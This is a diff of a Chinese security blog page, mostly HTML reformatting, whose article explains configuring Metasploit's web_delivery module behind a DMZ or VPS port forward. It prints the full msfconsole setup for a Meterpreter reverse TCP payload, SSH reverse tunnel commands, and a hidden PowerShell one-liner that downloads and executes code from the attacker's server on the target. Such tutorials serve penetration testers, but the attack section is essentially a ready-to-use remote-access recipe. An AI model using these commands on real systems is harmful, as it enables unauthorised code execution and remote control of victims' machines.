@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -109,7 +92,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="DMZ下使用web_delivery 介绍">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Use_Web_delivery_Under_DMZ.html">
-<meta property="og:site_name" content="Evi1cg&#39;s blog">
+<meta property="og:site_name" content="Evi1cg's blog">
 <meta property="og:description" content="之前碰到的问题，自己的主机做了DMZ，设置[b]web_delivery[/b]时，发现将lhost设置成外网ip，则脚本不能运行，如果设置成内网ip，则反弹payload反弹的地址为内网地址，即不可能获取到会话，查看详细配置信息，发现存在reverselistenerbindaddress 设置选项，解决了此问题，当然，此参数也适用于用vps转发端口使用本地msf的情况。详细配置如下： 使用vp">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2019-01-14T14:44:26.000Z">
@@ -495,11 +478,11 @@
       
 
       
-        <p>之前碰到的问题，自己的主机做了DMZ，设置[b]web_delivery[/b]时，发现将lhost设置成外网ip，则脚本不能运行，如果设置成内网ip，则反弹payload反弹的地址为内网地址，即不可能获取到会话，查看详细配置信息，发现存在reverselistenerbindaddress 设置选项，解决了此问题，当然，此参数也适用于用vps转发端口使用本地msf的情况。详细配置如下：</p>
-<p>使用vps转发 8081 端口到本地8081端口 (web_delivery服务端口)<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-N</span> <span class="selector-tag">-R</span> 8081<span class="selector-pseudo">:ip</span><span class="selector-pseudo">:8081</span> <span class="selector-tag">user</span>@<span class="keyword">ip</span></span><br></pre></td></tr></table></figure></p>
-<p>使用vps转发 6666 端口到本地6666端口 （web_delivery payload 监听端口）<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-N</span> <span class="selector-tag">-R</span> 6666<span class="selector-pseudo">:ip</span><span class="selector-pseudo">:6666</span> <span class="selector-tag">user</span>@<span class="keyword">ip</span></span><br></pre></td></tr></table></figure></p>
-<p>msf开启并配置web_delivery<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; <span class="keyword">set</span> target <span class="comment">2</span></span><br><span class="line">target <span class="comment">=&gt; 2</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">payload <span class="comment">=&gt; windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set SRVPORT 8081</span></span><br><span class="line">SRVPORT <span class="comment">=&gt; 8081</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set URIPATH</span> /</span><br><span class="line">URIPATH =&gt; /</span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set lhost ip  #</span>外网<span class="comment">ip</span>地址</span><br><span class="line">lhost <span class="comment">=&gt; ip</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set lport 6666</span></span><br><span class="line">lport <span class="comment">=&gt; 6666</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; set reverselistenerbindaddress 192.168.2.100 #</span>内网<span class="comment">ip</span>地址</span><br><span class="line">reverselistenerbindaddress <span class="comment">=&gt; 192.168.2.100</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; exploit</span></span><br><span class="line">[*] Exploit <span class="comment">running as background job.</span></span><br><span class="line"></span><br><span class="line">[*] Started <span class="comment">reverse TCP handler on 192.168.2.100:6666</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) &gt; [*] Using URL: http:</span>//<span class="comment">0.0.0.0:8081</span>/</span><br><span class="line">[*] Local IP: http:<span class="comment">//192.168.2.100:8081/</span></span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring(<span class="comment">'http://外网ip:8081/'</span>);</span><br></pre></td></tr></table></figure></p>
-<p>客户端执行：<br><code>powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring(&#39;http://外网ip:8081/&#39;);</code></p>
+        <meta name="generator" content="Hexo 3.9.0"><p>之前碰到的问题，自己的主机做了DMZ，设置[b]web_delivery[/b]时，发现将lhost设置成外网ip，则脚本不能运行，如果设置成内网ip，则反弹payload反弹的地址为内网地址，即不可能获取到会话，查看详细配置信息，发现存在reverselistenerbindaddress 设置选项，解决了此问题，当然，此参数也适用于用vps转发端口使用本地msf的情况。详细配置如下：</p>
+<p>使用vps转发 8081 端口到本地8081端口 (web_delivery服务端口)<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-N</span> <span class="selector-tag">-R</span> 8081<span class="selector-pseudo">:ip</span><span class="selector-pseudo">:8081</span> <span class="selector-tag">user</span>@<span class="keyword">ip</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>使用vps转发 6666 端口到本地6666端口 （web_delivery payload 监听端口）<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-N</span> <span class="selector-tag">-R</span> 6666<span class="selector-pseudo">:ip</span><span class="selector-pseudo">:6666</span> <span class="selector-tag">user</span>@<span class="keyword">ip</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>msf开启并配置web_delivery<br></p><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf > use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) > <span class="keyword">set</span> target <span class="comment">2</span></span><br><span class="line">target <span class="comment">=> 2</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) > set payload windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">payload <span class="comment">=> windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) > set SRVPORT 8081</span></span><br><span class="line">SRVPORT <span class="comment">=> 8081</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) > set URIPATH</span> /</span><br><span class="line">URIPATH => /</span><br><span class="line">msf <span class="comment">exploit(web_delivery) > set lhost ip  #</span>外网<span class="comment">ip</span>地址</span><br><span class="line">lhost <span class="comment">=> ip</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) > set lport 6666</span></span><br><span class="line">lport <span class="comment">=> 6666</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) > set reverselistenerbindaddress 192.168.2.100 #</span>内网<span class="comment">ip</span>地址</span><br><span class="line">reverselistenerbindaddress <span class="comment">=> 192.168.2.100</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) > exploit</span></span><br><span class="line">[*] Exploit <span class="comment">running as background job.</span></span><br><span class="line"></span><br><span class="line">[*] Started <span class="comment">reverse TCP handler on 192.168.2.100:6666</span></span><br><span class="line">msf <span class="comment">exploit(web_delivery) > [*] Using URL: http:</span>//<span class="comment">0.0.0.0:8081</span>/</span><br><span class="line">[*] Local IP: http:<span class="comment">//192.168.2.100:8081/</span></span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring(<span class="comment">'http://外网ip:8081/'</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>客户端执行：<br><code>powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://外网ip:8081/');</code></p>
 <p>内网msf获取meterpreter会话。</p>
 <p>DMZ情形下，不需要做端口转发，只需要把lhost设置为外网ip地址，reverselistenerbindaddress 设置为内网ip地址即可。</p>
 
@@ -846,7 +829,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -857,7 +840,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -868,7 +851,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -879,7 +862,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -914,7 +897,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1596,5 +1579,6 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
-</html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
